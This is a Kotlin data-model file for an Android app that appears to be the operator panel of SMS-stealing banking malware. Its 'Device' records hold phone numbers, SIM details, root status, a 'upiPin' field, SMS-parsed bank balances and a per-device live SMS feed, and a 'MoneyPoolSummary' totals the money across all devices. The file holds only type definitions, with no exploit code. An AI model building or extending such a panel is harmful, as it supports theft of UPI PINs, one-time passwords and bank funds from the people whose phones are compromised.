package com.zenin.app.data

import com.google.gson.annotations.SerializedName

// ─── Auth Models ─────────────────────────────────────────────────────────────

data class UserProfile(
    val userId: String = "",
    val name: String = "",
    val role: String = "",
    val tgUid: Long = 0L
)

data class SessionInfo(
    val id: Int = 0,
    val ip: String? = null,
    val userAgent: String? = null,
    val city: String? = null,
    val region: String? = null,
    val country: String? = null,
    val occurredAt: String = ""
) {
    val displayLocation: String get() = listOfNotNull(city, country).joinToString(", ").ifBlank { ip ?: "Unknown" }
}

sealed class LoginResult {
    data class OtpPending(val otpId: String) : LoginResult()
    data class Success(val token: String, val user: UserProfile, val loginEventId: Long) : LoginResult()
    data class CapacityFull(val sessions: List<SessionInfo>, val preAuthId: String) : LoginResult()
    data class Error(val message: String) : LoginResult()
}

sealed class OtpResult {
    data class Success(val token: String, val user: UserProfile, val loginEventId: Long) : OtpResult()
    data class CapacityFull(val sessions: List<SessionInfo>, val preAuthId: String) : OtpResult()
    data class Error(val message: String, val attemptsLeft: Int = 0) : OtpResult()
}

sealed class EvictResult {
    data class OtpPending(val otpId: String) : EvictResult()
    data class Success(val token: String, val user: UserProfile) : EvictResult()
    data class Error(val message: String) : EvictResult()
}

// ─── Device Models ────────────────────────────────────────────────────────────

data class SimCard(
    val phoneNumber: String = "",
    val carrierName: String = ""
)

data class BankBalance(
    val bankName: String = "",
    val balance: Long = 0L,
    val accountNumber: String? = null
)

data class SmsAnalysis(
    val bankBalances: List<BankBalance> = emptyList()
) {
    val totalBalance: Long get() = bankBalances.sumOf { it.balance }
}

data class Device(
    val id: String = "",
    val panelId: String = "",
    val name: String = "",
    val status: Boolean = false,
    val battery: Int? = null,
    val batteryRaw: String = "",
    val mobNo: String = "",
    val ipAddress: String = "",
    val androidV: String = "",
    val storage: String = "",
    val sdkV: String = "",
    val cpuArch: String = "",
    val isRoot: Boolean = false,
    val isSdCard: Boolean = false,
    val serviceProvider: String = "",
    val upiPin: String? = null,
    val note: String = "",
    val sims: List<SimCard> = emptyList(),
    val joined: String = "",
    val joinedTs: Long = 0L,
    val lastSeen: Long = 0L,
    val smsAnalysis: SmsAnalysis? = null
)

data class MoneyPoolSummary(
    val totalBalance: Long = 0L,
    val fundCount: Int = 0,
    val unknownCount: Int = 0
)

// ─── SMS Models ───────────────────────────────────────────────────────────────

data class SmsMessage(
    val key: String = "",
    val message: String = "",
    val sender: String = "",
    val dateTime: String = "",
    val type: String = "incoming",
    val ts: Long = 0L
)

// ─── SSE Event Models ─────────────────────────────────────────────────────────

sealed class SseEvent {
    data class DeviceUpdate(val panelId: String, val device: Device) : SseEvent()
    data class NewSms(val panelId: String, val deviceId: String, val messages: List<SmsMessage>) : SseEvent()
    data class Unknown(val type: String) : SseEvent()
}

// ─── Raw JSON response wrappers (for Gson parsing) ────────────────────────────

internal data class RawLoginResponse(
    val token: String? = null,
    val user: UserProfile? = null,
    val loginEventId: Long? = null,
    val otpPending: Boolean? = null,
    val otpId: String? = null,
    val error: String? = null,
    val activeSessions: List<SessionInfo>? = null,
    val preAuthId: String? = null,
    val attemptsLeft: Int? = null
)

internal data class RawDevicesResponse(
    val devices: List<Device> = emptyList(),
    val total: Int = 0,
    val summary: MoneyPoolSummary? = null
)

internal data class RawSmsResponse(
    val messages: List<SmsMessage> = emptyList(),
    val total: Int = 0
)

internal data class RawSessionsResponse(
    val sessions: List<SessionInfo> = emptyList()
)

internal data class RawSsePayload(
    val type: String = "",
    val panelId: String = "",
    val device: Device? = null,
    val deviceId: String = "",
    val messages: List<SmsMessage>? = null
)
